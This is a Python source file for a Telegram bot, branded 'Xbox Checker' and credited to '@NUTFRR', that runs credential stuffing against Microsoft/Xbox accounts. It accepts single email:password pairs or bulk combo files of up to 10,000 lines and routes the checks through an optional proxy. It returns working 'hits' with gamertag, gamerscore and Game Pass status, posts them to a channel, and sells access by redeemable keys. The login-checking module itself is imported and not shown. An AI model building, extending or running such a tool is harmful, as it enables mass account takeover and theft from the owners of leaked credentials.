"""
╔══════════════════════════════════════════════════════╗
║          XBOX CHECKER — TELEGRAM BOT                 ║
║               MADE BY - @NUTFRR                      ║
╚══════════════════════════════════════════════════════╝
"""

import os
import io
import json
import time
import string
import random
import asyncio
import traceback
from datetime import datetime, timedelta
from pathlib import Path

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
    BotCommand,
    InputFile,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)
from telegram.constants import ParseMode
from telegram.request import HTTPXRequest

from checker import check_account, check_bulk, CheckResult
from checker import STATUS_HIT, STATUS_BAD, STATUS_ERROR, STATUS_LOCKED, STATUS_NO_XBOX

# ── Config ─────────────────────────────────────────────────────────────────────
DATA_DIR = Path("data")
DATA_DIR.mkdir(exist_ok=True)

CONFIG_FILE   = DATA_DIR / "config.json"
USERS_FILE    = DATA_DIR / "users.json"
CODES_FILE    = DATA_DIR / "codes.json"
STATS_FILE    = DATA_DIR / "stats.json"
RESULTS_FILE  = DATA_DIR / "results.json"

CREDIT = "@NUTFRR"


# ── Storage ────────────────────────────────────────────────────────────────────
def _load(path: Path, default):
    if path.exists():
        try:
            return json.loads(path.read_text())
        except Exception:
            pass
    return default

def _save(path: Path, data):
    path.write_text(json.dumps(data, indent=2))


class Store:
    def __init__(self):
        self.config   = _load(CONFIG_FILE, {"bot_enabled": True, "hits_channel": None, "proxy": None})
        self.users    = _load(USERS_FILE, {})
        self.codes    = _load(CODES_FILE, {})
        self.stats    = _load(STATS_FILE, {"total": 0, "hits": 0, "bad": 0, "errors": 0, "locked": 0, "no_xbox": 0})
        self.results  = _load(RESULTS_FILE, [])
        # live check sessions: {user_id: {stop_event, task, counts}}
        self.sessions: dict = {}
        # state machine: {user_id: pending_action_str}
        self.pending: dict = {}

    def save_all(self):
        _save(CONFIG_FILE, self.config)
        _save(USERS_FILE,  self.users)
        _save(CODES_FILE,  self.codes)
        _save(STATS_FILE,  self.stats)
        _save(RESULTS_FILE, self.results[-5000:])  # keep last 5k

    def is_admin(self, uid: int) -> bool:
        env = os.environ.get("ADMIN_ID") or os.environ.get("ADMIN_IDS")
        cfg = self.config.get("admin_id")
        for val in [env, cfg]:
            if val:
                try:
                    if int(val) == int(uid):
                        return True
                except Exception:
                    pass
        return False

    def is_authorized(self, uid: int) -> bool:
        if self.is_admin(uid):
            return True
        u = self.users.get(str(uid))
        if not u or not u.get("active"):
            return False
        exp = u.get("expires")
        if exp and exp != "lifetime" and time.time() > float(exp):
            u["active"] = False
            _save(USERS_FILE, self.users)
            return False
        return True

    def authorize(self, uid: int, by: int, days=None):
        exp = "lifetime"
        if days and days != "lifetime":
            exp = str(time.time() + int(days) * 86400)
        self.users[str(uid)] = {
            "active": True,
            "added_by": str(by),
            "added_at": str(datetime.now()),
            "expires": exp,
        }
        _save(USERS_FILE, self.users)

    def revoke(self, uid: int):
        if str(uid) in self.users:
            del self.users[str(uid)]
            _save(USERS_FILE, self.users)

    def gen_code(self, days, by: int) -> str:
        code = "NUTFRR-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
        self.codes[code] = {"days": days, "by": str(by), "at": str(datetime.now())}
        _save(CODES_FILE, self.codes)
        return code

    def use_code(self, uid: int, code: str):
        if code not in self.codes:
            return False, "Invalid or already used code."
        c = self.codes.pop(code)
        _save(CODES_FILE, self.codes)
        self.authorize(uid, 0, c["days"])
        return True, c["days"]

    def add_result(self, r: CheckResult):
        self.results.append(r.to_dict())
        self.stats["total"] += 1
        if r.status == STATUS_HIT:      self.stats["hits"] += 1
        elif r.status == STATUS_BAD:    self.stats["bad"] += 1
        elif r.status == STATUS_LOCKED: self.stats["locked"] += 1
        elif r.status == STATUS_NO_XBOX:self.stats["no_xbox"] += 1
        else:                           self.stats["errors"] += 1
        _save(STATS_FILE, self.stats)

    def track(self, uid: int):
        u = self.users.get(str(uid), {})
        u.setdefault("checks", 0)
        u["checks"] += 1
        u["last"] = str(datetime.now())
        self.users[str(uid)] = u
        _save(USERS_FILE, self.users)


store = Store()


# ── Keyboards ─────────────────────────────────────────────────────────────────
def kb_main(uid: int) -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton("🎮 Check Single",   callback_data="single"),
            InlineKeyboardButton("📂 Check File",     callback_data="bulk"),
        ],
        [
            InlineKeyboardButton("📊 My Stats",       callback_data="my_stats"),
            InlineKeyboardButton("📋 Last Hits",      callback_data="last_hits"),
        ],
        [
            InlineKeyboardButton("ℹ️ Help",           callback_data="help"),
            InlineKeyboardButton("🔑 Redeem Key",     callback_data="redeem"),
        ],
    ]
    if store.is_admin(uid):
        rows.append([
            InlineKeyboardButton("🛡️ Admin Panel",   callback_data="admin_panel"),
        ])
    return InlineKeyboardMarkup(rows)


def kb_admin() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("👥 Users",          callback_data="admin_users"),
            InlineKeyboardButton("📊 Global Stats",   callback_data="admin_stats"),
        ],
        [
            InlineKeyboardButton("🔑 Gen Key",        callback_data="admin_genkey"),
            InlineKeyboardButton("✅ Auth User",      callback_data="admin_auth"),
        ],
        [
            InlineKeyboardButton("❌ Revoke User",    callback_data="admin_revoke"),
            InlineKeyboardButton("📢 Broadcast",      callback_data="admin_broadcast"),
        ],
        [
            InlineKeyboardButton("📡 Set Hits Ch",    callback_data="admin_setchannel"),
            InlineKeyboardButton("🔄 Reload",         callback_data="admin_panel"),
        ],
        [InlineKeyboardButton("⬅️ Back",              callback_data="main_menu")],
    ])


def kb_check_running(uid: int) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🛑 Stop Check",        callback_data=f"stop_{uid}")],
        [InlineKeyboardButton("📊 Progress",          callback_data=f"progress_{uid}")],
    ])


def kb_back() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([[InlineKeyboardButton("⬅️ Back", callback_data="main_menu")]])


# ── Helpers ────────────────────────────────────────────────────────────────────
def banner(uid: int) -> str:
    return (
        "╔══════════════════════════════╗\n"
        "║   🎮  <b>XBOX CHECKER PRO</b>   🎮   ║\n"
        "╚══════════════════════════════╝\n\n"
        f"<i>MADE BY {CREDIT}</i>"
    )


def status_emoji(status: str) -> str:
    return {
        STATUS_HIT:    "✅",
        STATUS_BAD:    "❌",
        STATUS_ERROR:  "⚠️",
        STATUS_LOCKED: "🔒",
        STATUS_NO_XBOX:"🎮",
    }.get(status, "❓")


async def forward_hit(bot, result: CheckResult):
    ch = store.config.get("hits_channel")
    if not ch:
        return
    try:
        await bot.send_message(chat_id=ch, text=result.hit_text(), parse_mode=ParseMode.HTML)
    except Exception:
        pass


def build_progress_text(session: dict) -> str:
    c = session.get("counts", {})
    total   = c.get("total", 0)
    done    = c.get("done", 0)
    hits    = c.get("hits", 0)
    bad     = c.get("bad", 0)
    errors  = c.get("errors", 0)
    locked  = c.get("locked", 0)
    no_xbox = c.get("no_xbox", 0)
    pct     = int((done / max(total, 1)) * 100)
    bar_len = 20
    filled  = int(bar_len * done / max(total, 1))
    bar     = "█" * filled + "░" * (bar_len - filled)
    return (
        f"🎮 <b>Xbox Checker — Live Progress</b>\n\n"
        f"[{bar}] {pct}%\n\n"
        f"📦 Total:   <code>{total}</code>\n"
        f"✅ Hits:    <code>{hits}</code>\n"
        f"❌ Bad:     <code>{bad}</code>\n"
        f"🔒 Locked:  <code>{locked}</code>\n"
        f"🎮 No Xbox: <code>{no_xbox}</code>\n"
        f"⚠️  Errors:  <code>{errors}</code>\n"
        f"📊 Done:    <code>{done}/{total}</code>\n\n"
        f"<i>MADE BY {CREDIT}</i>"
    )


# ── /start ─────────────────────────────────────────────────────────────────────
async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    name = update.effective_user.first_name or "User"
    text = (
        f"{banner(uid)}\n\n"
        f"👋 Yo <b>{name}</b>!\n\n"
        f"Premium Xbox account checker.\n"
        f"Validates creds → pulls gamertag, gamerscore, tier, subscriptions.\n\n"
        f"Use the buttons below to get started."
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb_main(uid))


# ── Callback handler ───────────────────────────────────────────────────────────
async def callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    uid = q.from_user.id
    data = q.data
    await q.answer()

    # ── main_menu
    if data == "main_menu":
        await q.edit_message_text(banner(uid), parse_mode=ParseMode.HTML, reply_markup=kb_main(uid))

    # ── single check prompt
    elif data == "single":
        if not store.is_authorized(uid):
            await q.edit_message_text(
                "🔒 <b>Not Authorized</b>\n\nGet a key from the admin or use /redeem.",
                parse_mode=ParseMode.HTML, reply_markup=kb_back()
            )
            return
        await q.edit_message_text(
            "🎮 <b>Single Account Check</b>\n\n"
            "Send me the credentials in this format:\n"
            "<code>email@outlook.com:Password123</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_back()
        )
        store.pending[uid] = "single_check"

    # ── bulk check prompt
    elif data == "bulk":
        if not store.is_authorized(uid):
            await q.edit_message_text(
                "🔒 <b>Not Authorized</b>",
                parse_mode=ParseMode.HTML, reply_markup=kb_back()
            )
            return
        await q.edit_message_text(
            "📂 <b>Bulk Check via File</b>\n\n"
            "Upload a <code>.txt</code> file with one account per line:\n\n"
            "<code>email1:password1\nemail2:password2</code>\n\n"
            "Max: 10,000 lines per file.",
            parse_mode=ParseMode.HTML, reply_markup=kb_back()
        )
        store.pending[uid] = "bulk_upload"

    # ── my stats
    elif data == "my_stats":
        u = store.users.get(str(uid), {})
        exp = u.get("expires", "—")
        if exp != "lifetime" and exp != "—":
            try:
                remaining = int((float(exp) - time.time()) / 86400)
                exp = f"{remaining} days left"
            except Exception:
                pass
        checks = u.get("checks", 0)
        status = "✅ Active" if store.is_authorized(uid) else "❌ Not Authorized"
        tier = "👑 Admin" if store.is_admin(uid) else status
        text = (
            f"📊 <b>Your Stats</b>\n\n"
            f"🆔 UID: <code>{uid}</code>\n"
            f"🔑 Access: <b>{tier}</b>\n"
            f"⏳ Expires: <code>{exp}</code>\n"
            f"🔢 Total Checks: <code>{checks}</code>\n\n"
            f"<i>MADE BY {CREDIT}</i>"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── last hits
    elif data == "last_hits":
        if not store.is_authorized(uid):
            await q.edit_message_text("🔒 Not authorized.", parse_mode=ParseMode.HTML, reply_markup=kb_back())
            return
        hits = [r for r in reversed(store.results) if r.get("status") == STATUS_HIT][:10]
        if not hits:
            await q.edit_message_text("No hits yet. Start checking!", parse_mode=ParseMode.HTML, reply_markup=kb_back())
            return
        lines = [f"✅ <code>{r['email']}</code> → <b>{r.get('gamertag','?')}</b>" for r in hits]
        text = "🏆 <b>Recent Hits (last 10)</b>\n\n" + "\n".join(lines) + f"\n\n<i>MADE BY {CREDIT}</i>"
        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── help
    elif data == "help":
        text = (
            f"ℹ️ <b>Xbox Checker — Help</b>\n\n"
            f"<b>Commands:</b>\n"
            f"/start — Main menu\n"
            f"/check email:pass — Quick single check\n"
            f"/redeem CODE — Redeem access key\n"
            f"/stats — Your stats\n\n"
            f"<b>Admin Commands:</b>\n"
            f"/genkey [days/lifetime] — Generate key\n"
            f"/auth [user_id] [days] — Authorize user\n"
            f"/revoke [user_id] — Remove user\n"
            f"/broadcast msg — Message all users\n"
            f"/panel — Admin panel\n\n"
            f"<i>MADE BY {CREDIT}</i>"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb_back())

    # ── redeem prompt
    elif data == "redeem":
        await q.edit_message_text(
            "🔑 <b>Redeem Key</b>\n\nSend: <code>/redeem YOUR-KEY-HERE</code>",
            parse_mode=ParseMode.HTML, reply_markup=kb_back()
        )

    # ── admin panel
    elif data == "admin_panel":
        if not store.is_admin(uid):
            await q.answer("Access denied.", show_alert=True)
            return
        s = store.stats
        total_users = len([u for u in store.users.values() if u.get("active")])
        rate = int(s["hits"] / max(s["total"], 1) * 100)
        text = (
            f"🛡️ <b>Admin Panel</b>\n\n"
            f"👥 Active Users: <code>{total_users}</code>\n"
            f"📦 Total Checked: <code>{s['total']}</code>\n"
            f"✅ Hits: <code>{s['hits']}</code>\n"
            f"❌ Bad: <code>{s['bad']}</code>\n"
            f"🔒 Locked: <code>{s['locked']}</code>\n"
            f"⚠️ Errors: <code>{s['errors']}</code>\n"
            f"🎯 Hit Rate: <code>{rate}%</code>\n\n"
            f"<i>MADE BY {CREDIT}</i>"
        )
        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb_admin())

    # ── admin stats (same as panel)
    elif data == "admin_stats":
        if not store.is_admin(uid):
            return
        await callback(update, ctx)  # reuse admin_panel text

    # ── admin users list
    elif data == "admin_users":
        if not store.is_admin(uid):
            return
        lines = []
        for uid_str, u in store.users.items():
            if not u.get("active"):
                continue
            exp = u.get("expires", "?")
            if exp != "lifetime":
                try:
                    days_left = int((float(exp) - time.time()) / 86400)
                    exp = f"{days_left}d left"
                except Exception:
                    pass
            lines.append(f"• <code>{uid_str}</code> — {exp} — {u.get('checks',0)} checks")
        text = "👥 <b>Authorized Users</b>\n\n" + ("\n".join(lines) or "None yet.") + f"\n\n<i>MADE BY {CREDIT}</i>"
        if len(text) > 4000:
            text = text[:4000] + "\n..."
        await q.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=kb_admin())

    # ── admin_genkey prompt
    elif data == "admin_genkey":
        if not store.is_admin(uid):
            return
        await q.edit_message_text(
            "🔑 <b>Generate Key</b>\n\nReply with days (number) or <code>lifetime</code>:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin()
        )
        store.pending[uid] = "admin_genkey"

    # ── admin_auth prompt
    elif data == "admin_auth":
        if not store.is_admin(uid):
            return
        await q.edit_message_text(
            "✅ <b>Authorize User</b>\n\nSend: <code>user_id days</code> (or <code>user_id lifetime</code>):",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin()
        )
        store.pending[uid] = "admin_auth"

    # ── admin_revoke prompt
    elif data == "admin_revoke":
        if not store.is_admin(uid):
            return
        await q.edit_message_text(
            "❌ <b>Revoke User</b>\n\nSend the user ID to revoke:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin()
        )
        store.pending[uid] = "admin_revoke"

    # ── admin broadcast prompt
    elif data == "admin_broadcast":
        if not store.is_admin(uid):
            return
        await q.edit_message_text(
            "📢 <b>Broadcast</b>\n\nSend your message to broadcast to all users:",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin()
        )
        store.pending[uid] = "admin_broadcast"

    # ── admin set hits channel
    elif data == "admin_setchannel":
        if not store.is_admin(uid):
            return
        await q.edit_message_text(
            "📡 <b>Set Hits Channel</b>\n\nSend channel ID (e.g. <code>-1001234567890</code>):",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin()
        )
        store.pending[uid] = "admin_setchannel"

    # ── stop check
    elif data.startswith("stop_"):
        target = int(data.split("_")[1])
        sess = store.sessions.get(target)
        if sess:
            sess["stop_event"].set()
            await q.edit_message_text(
                "🛑 <b>Check Stopped</b>\n\n" + build_progress_text(sess),
                parse_mode=ParseMode.HTML, reply_markup=kb_main(uid)
            )
        else:
            await q.edit_message_text("No active check.", parse_mode=ParseMode.HTML, reply_markup=kb_main(uid))

    # ── progress
    elif data.startswith("progress_"):
        target = int(data.split("_")[1])
        sess = store.sessions.get(target)
        if sess:
            await q.edit_message_text(
                build_progress_text(sess),
                parse_mode=ParseMode.HTML, reply_markup=kb_check_running(target)
            )
        else:
            await q.edit_message_text("No active check.", parse_mode=ParseMode.HTML, reply_markup=kb_main(uid))


# ── Message handler (text + document) ─────────────────────────────────────────
async def message_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    msg = update.message

    # ── Document upload (bulk)
    if msg.document:
        if store.pending.get(uid) == "bulk_upload" or msg.document.file_name.endswith(".txt"):
            if not store.is_authorized(uid):
                await msg.reply_text("🔒 Not authorized.", parse_mode=ParseMode.HTML)
                store.pending.pop(uid, None)
                return
            store.pending.pop(uid, None)
            await _handle_bulk(msg, uid, ctx)
        return

    text = (msg.text or "").strip()
    pending = store.pending.pop(uid, None)

    # ── single check from pending
    if pending == "single_check":
        if ":" not in text:
            await msg.reply_text("❌ Format: <code>email:password</code>", parse_mode=ParseMode.HTML)
            return
        email, password = text.split(":", 1)
        await _run_single(msg, uid, email.strip(), password.strip(), ctx)
        return

    # ── admin genkey
    if pending == "admin_genkey":
        if not store.is_admin(uid):
            return
        days = text.strip()
        code = store.gen_code(days, uid)
        await msg.reply_text(
            f"🔑 <b>Key Generated</b>\n\n<code>{code}</code>\nValidity: <b>{days}</b> days\n\n<i>MADE BY {CREDIT}</i>",
            parse_mode=ParseMode.HTML, reply_markup=kb_admin()
        )
        return

    # ── admin auth
    if pending == "admin_auth":
        if not store.is_admin(uid):
            return
        parts = text.split()
        if len(parts) < 1:
            await msg.reply_text("Usage: <code>user_id days</code>", parse_mode=ParseMode.HTML)
            return
        try:
            target_uid = int(parts[0])
            days = parts[1] if len(parts) > 1 else "lifetime"
            store.authorize(target_uid, uid, days)
            await msg.reply_text(f"✅ Authorized <code>{target_uid}</code> for {days} days.", parse_mode=ParseMode.HTML)
        except Exception as e:
            await msg.reply_text(f"❌ Error: {e}", parse_mode=ParseMode.HTML)
        return

    # ── admin revoke
    if pending == "admin_revoke":
        if not store.is_admin(uid):
            return
        try:
            target_uid = int(text.strip())
            store.revoke(target_uid)
            await msg.reply_text(f"❌ Revoked <code>{target_uid}</code>.", parse_mode=ParseMode.HTML)
        except Exception as e:
            await msg.reply_text(f"❌ Error: {e}", parse_mode=ParseMode.HTML)
        return

    # ── admin broadcast
    if pending == "admin_broadcast":
        if not store.is_admin(uid):
            return
        sent = 0
        for uid_str in store.users:
            try:
                await ctx.bot.send_message(
                    chat_id=int(uid_str),
                    text=f"📢 <b>Admin Broadcast:</b>\n\n{text}",
                    parse_mode=ParseMode.HTML
                )
                sent += 1
            except Exception:
                pass
        await msg.reply_text(f"📢 Sent to {sent} users.", parse_mode=ParseMode.HTML)
        return

    # ── admin set channel
    if pending == "admin_setchannel":
        if not store.is_admin(uid):
            return
        store.config["hits_channel"] = text.strip()
        _save(CONFIG_FILE, store.config)
        await msg.reply_text(f"📡 Hits channel set to <code>{text.strip()}</code>", parse_mode=ParseMode.HTML)
        return


async def _run_single(msg, uid: int, email: str, password: str, ctx):
    wait = await msg.reply_text(
        f"⏳ Checking <code>{email}</code>...",
        parse_mode=ParseMode.HTML
    )
    result = await check_account(email, password, proxy=store.config.get("proxy"))
    store.add_result(result)
    store.track(uid)

    emoji = status_emoji(result.status)

    if result.status == STATUS_HIT:
        text = result.hit_text()
        await forward_hit(ctx.bot, result)
    elif result.status == STATUS_NO_XBOX:
        text = (
            f"🎮 <b>Valid MS — No Xbox</b>\n\n"
            f"📧 <code>{email}</code>:{password}\n"
            f"<i>Account valid but no Xbox profile linked.</i>"
        )
    elif result.status == STATUS_LOCKED:
        text = (
            f"🔒 <b>Account Locked</b>\n\n"
            f"📧 <code>{email}</code>\n"
            f"<i>Requires verification or recovery.</i>"
        )
    elif result.status == STATUS_BAD:
        text = f"❌ <b>Bad Credentials</b>\n\n<code>{email}</code>"
    else:
        text = f"⚠️ <b>Error</b>\n\n<code>{email}</code>\n{result.error_msg}"

    await wait.edit_text(text, parse_mode=ParseMode.HTML, reply_markup=kb_main(uid))


async def _handle_bulk(msg, uid: int, ctx):
    file_obj = await msg.document.get_file()
    buf = io.BytesIO()
    await file_obj.download_to_memory(buf)
    content = buf.getvalue().decode("utf-8", errors="ignore")
    lines = [l.strip() for l in content.splitlines() if ":" in l and "@" in l]
    if not lines:
        await msg.reply_text("❌ No valid accounts found (need <code>email:pass</code> format).", parse_mode=ParseMode.HTML)
        return
    if len(lines) > 10000:
        await msg.reply_text("❌ Max 10,000 lines per file.", parse_mode=ParseMode.HTML)
        return

    accounts = []
    for line in lines:
        parts = line.split(":", 1)
        if len(parts) == 2:
            accounts.append((parts[0].strip(), parts[1].strip()))

    total = len(accounts)
    stop_event = asyncio.Event()
    counts = {"total": total, "done": 0, "hits": 0, "bad": 0, "errors": 0, "locked": 0, "no_xbox": 0}
    store.sessions[uid] = {"stop_event": stop_event, "counts": counts}

    status_msg = await msg.reply_text(
        f"🚀 <b>Bulk Check Started</b>\n\n📦 Accounts: <code>{total}</code>\n\n⏳ Running...",
        parse_mode=ParseMode.HTML,
        reply_markup=kb_check_running(uid)
    )

    hits_buf = []
    bad_buf  = []
    last_edit = time.time()

    async def on_result(r: CheckResult, idx: int, ttl: int):
        nonlocal last_edit
        counts["done"] = idx
        if r.status == STATUS_HIT:
            counts["hits"] += 1
            hits_buf.append(r)
            await forward_hit(ctx.bot, r)
        elif r.status == STATUS_BAD:
            counts["bad"] += 1
            bad_buf.append(r)
        elif r.status == STATUS_LOCKED:
            counts["locked"] += 1
        elif r.status == STATUS_NO_XBOX:
            counts["no_xbox"] += 1
        else:
            counts["errors"] += 1

        store.add_result(r)

        # Update status message every 5s or last result
        if time.time() - last_edit >= 5 or idx == ttl:
            last_edit = time.time()
            try:
                await status_msg.edit_text(
                    build_progress_text(store.sessions.get(uid, {"counts": counts})),
                    parse_mode=ParseMode.HTML,
                    reply_markup=kb_check_running(uid) if idx < ttl else kb_main(uid)
                )
            except Exception:
                pass

    store.track(uid)
    proxy = store.config.get("proxy")
    await check_bulk(accounts, on_result=on_result, max_concurrent=5, proxy=proxy, stop_event=stop_event)

    # Send results files
    if hits_buf:
        hits_text = "\n".join(f"{r.email}:{r.password} | {r.gamertag} | {r.gamerscore}pts | GP:{r.game_pass}" for r in hits_buf)
        hits_file = io.BytesIO(hits_text.encode())
        hits_file.name = f"hits_{int(time.time())}.txt"
        await ctx.bot.send_document(
            chat_id=msg.chat_id,
            document=InputFile(hits_file, filename=hits_file.name),
            caption=(
                f"✅ <b>Hits: {counts['hits']}/{total}</b>\n"
                f"<i>MADE BY {CREDIT}</i>"
            ),
            parse_mode=ParseMode.HTML
        )

    if bad_buf:
        bad_text = "\n".join(f"{r.email}:{r.password}" for r in bad_buf)
        bad_file = io.BytesIO(bad_text.encode())
        bad_file.name = f"bad_{int(time.time())}.txt"
        await ctx.bot.send_document(
            chat_id=msg.chat_id,
            document=InputFile(bad_file, filename=bad_file.name),
            caption=f"❌ <b>Bad: {counts['bad']}/{total}</b>",
            parse_mode=ParseMode.HTML
        )

    store.sessions.pop(uid, None)
    await ctx.bot.send_message(
        chat_id=msg.chat_id,
        text=(
            f"🏁 <b>Check Complete!</b>\n\n"
            + build_progress_text({"counts": counts})
        ),
        parse_mode=ParseMode.HTML,
        reply_markup=kb_main(uid)
    )


# ── Commands ───────────────────────────────────────────────────────────────────
async def cmd_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not store.is_authorized(uid):
        await update.message.reply_text("🔒 Not authorized. Use /redeem.", parse_mode=ParseMode.HTML)
        return
    if not ctx.args or ":" not in ctx.args[0]:
        await update.message.reply_text("Usage: <code>/check email:password</code>", parse_mode=ParseMode.HTML)
        return
    email, password = ctx.args[0].split(":", 1)
    await _run_single(update.message, uid, email.strip(), password.strip(), ctx)


async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not ctx.args:
        await update.message.reply_text("Usage: <code>/redeem YOUR-KEY</code>", parse_mode=ParseMode.HTML)
        return
    ok, val = store.use_code(uid, ctx.args[0].strip())
    if ok:
        await update.message.reply_text(
            f"✅ <b>Redeemed!</b>\nAccess granted for <b>{val}</b> days.",
            parse_mode=ParseMode.HTML, reply_markup=kb_main(uid)
        )
    else:
        await update.message.reply_text(f"❌ {val}", parse_mode=ParseMode.HTML)


async def cmd_genkey(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not store.is_admin(uid):
        await update.message.reply_text("❌ Access denied.", parse_mode=ParseMode.HTML)
        return
    days = ctx.args[0] if ctx.args else "30"
    code = store.gen_code(days, uid)
    await update.message.reply_text(
        f"🔑 <b>Key Generated</b>\n\n<code>{code}</code>\nValidity: <b>{days}</b> days",
        parse_mode=ParseMode.HTML
    )


async def cmd_auth(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not store.is_admin(uid):
        await update.message.reply_text("❌ Access denied.", parse_mode=ParseMode.HTML)
        return
    if not ctx.args:
        await update.message.reply_text("Usage: <code>/auth user_id [days]</code>", parse_mode=ParseMode.HTML)
        return
    target = int(ctx.args[0])
    days = ctx.args[1] if len(ctx.args) > 1 else "lifetime"
    store.authorize(target, uid, days)
    await update.message.reply_text(f"✅ Authorized <code>{target}</code> for {days} days.", parse_mode=ParseMode.HTML)


async def cmd_revoke(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not store.is_admin(uid):
        await update.message.reply_text("❌ Access denied.", parse_mode=ParseMode.HTML)
        return
    if not ctx.args:
        await update.message.reply_text("Usage: <code>/revoke user_id</code>", parse_mode=ParseMode.HTML)
        return
    store.revoke(int(ctx.args[0]))
    await update.message.reply_text(f"❌ Revoked <code>{ctx.args[0]}</code>.", parse_mode=ParseMode.HTML)


async def cmd_stats(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    s = store.stats
    u = store.users.get(str(uid), {})
    checks = u.get("checks", 0)
    exp = u.get("expires", "—")
    if exp not in ("lifetime", "—"):
        try:
            d = int((float(exp) - time.time()) / 86400)
            exp = f"{d} days left"
        except Exception:
            pass
    text = (
        f"📊 <b>Stats</b>\n\n"
        f"🔑 Access: {'✅ Active' if store.is_authorized(uid) else '❌ No'}\n"
        f"⏳ Expires: {exp}\n"
        f"🔢 Your Checks: <code>{checks}</code>\n\n"
        f"🌍 Global: <code>{s['total']}</code> checked | ✅ <code>{s['hits']}</code> hits\n\n"
        f"<i>MADE BY {CREDIT}</i>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb_main(uid))


async def cmd_panel(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not store.is_admin(uid):
        await update.message.reply_text("❌ Access denied.", parse_mode=ParseMode.HTML)
        return
    s = store.stats
    total_users = len([u for u in store.users.values() if u.get("active")])
    rate = int(s["hits"] / max(s["total"], 1) * 100)
    text = (
        f"🛡️ <b>Admin Panel</b>\n\n"
        f"👥 Users: <code>{total_users}</code>\n"
        f"📦 Checked: <code>{s['total']}</code>\n"
        f"✅ Hits: <code>{s['hits']}</code> ({rate}%)\n"
        f"❌ Bad: <code>{s['bad']}</code>\n"
        f"🔒 Locked: <code>{s['locked']}</code>\n"
        f"⚠️ Errors: <code>{s['errors']}</code>\n\n"
        f"<i>MADE BY {CREDIT}</i>"
    )
    await update.message.reply_text(text, parse_mode=ParseMode.HTML, reply_markup=kb_admin())


async def cmd_broadcast(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not store.is_admin(uid):
        await update.message.reply_text("❌ Access denied.", parse_mode=ParseMode.HTML)
        return
    if not ctx.args:
        await update.message.reply_text("Usage: <code>/broadcast message</code>", parse_mode=ParseMode.HTML)
        return
    msg_text = " ".join(ctx.args)
    sent = 0
    for uid_str in store.users:
        try:
            await ctx.bot.send_message(int(uid_str), f"📢 {msg_text}", parse_mode=ParseMode.HTML)
            sent += 1
        except Exception:
            pass
    await update.message.reply_text(f"📢 Sent to {sent} users.", parse_mode=ParseMode.HTML)


async def post_init(app):
    cmds = [
        BotCommand("start",      "Main menu"),
        BotCommand("check",      "Check single account (email:pass)"),
        BotCommand("redeem",     "Redeem access key"),
        BotCommand("stats",      "View your stats"),
        BotCommand("panel",      "Admin panel"),
        BotCommand("genkey",     "Admin: generate key"),
        BotCommand("auth",       "Admin: authorize user"),
        BotCommand("revoke",     "Admin: revoke user"),
        BotCommand("broadcast",  "Admin: broadcast message"),
    ]
    await app.bot.set_my_commands(cmds)
    print("🎮 Xbox Checker Bot started. MADE BY @NUTFRR")


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    token = os.environ.get("BOT_TOKEN") or os.environ.get("TELEGRAM_TOKEN")
    if not token:
        # Try loading from config
        cfg = _load(DATA_DIR / "config.json", {})
        token = cfg.get("bot_token")
    if not token:
        print("❌ BOT_TOKEN not set. Set env var BOT_TOKEN=your_token")
        return

    admin_id = os.environ.get("ADMIN_ID") or os.environ.get("ADMIN_IDS")
    if admin_id:
        store.config["admin_id"] = admin_id
        _save(CONFIG_FILE, store.config)

    request = HTTPXRequest(connect_timeout=60, read_timeout=60, write_timeout=60, pool_timeout=60)
    app = (
        ApplicationBuilder()
        .token(token)
        .request(request)
        .concurrent_updates(True)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start",     start))
    app.add_handler(CommandHandler("check",     cmd_check))
    app.add_handler(CommandHandler("redeem",    cmd_redeem))
    app.add_handler(CommandHandler("stats",     cmd_stats))
    app.add_handler(CommandHandler("panel",     cmd_panel))
    app.add_handler(CommandHandler("genkey",    cmd_genkey))
    app.add_handler(CommandHandler("auth",      cmd_auth))
    app.add_handler(CommandHandler("revoke",    cmd_revoke))
    app.add_handler(CommandHandler("broadcast", cmd_broadcast))
    app.add_handler(CallbackQueryHandler(callback))
    app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, message_handler))

    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
